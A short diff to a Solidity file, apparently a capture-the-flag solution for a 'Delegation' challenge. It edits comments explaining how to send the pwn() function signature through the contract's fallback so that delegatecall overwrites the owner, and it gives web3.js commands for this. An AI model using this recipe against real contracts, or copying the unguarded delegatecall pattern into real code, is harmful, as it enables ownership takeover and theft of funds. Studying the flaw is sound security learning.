@@ -15,10 +15,12 @@ contract Delegate {
 }
 
 
-// calling the fallback function inside "Delegation", we attach the "data" => abi.encodeWithSignature("pwn"), which will result in the function call 
-// => address(delegate).delegatecall(abi.encodeWithSignature("pwn"))
-// We are now calling the function "pwn()" inside contract "Delegate" in the name and with the state variables of contract "Delegation".
-// This will result in the change of the state variable "owner" inside "Delegation"
+// we need to get the function signature of pwn() and insert it into the data field and trigger the fallback function inside "delegation".
+//  => with web3 js
+/*
+  web3.utils.sha3("pwn()") => '0xdd365b8b15d5d78ec041b851b68c8b985bee78bee0b87c4acf261024d8beabab'
+  contract.sendTransaction({data: "0xdd365b8b15d5d78ec041b851b68c8b985bee78bee0b87c4acf261024d8beabab"})
+*/
 
 contract Delegation {
 
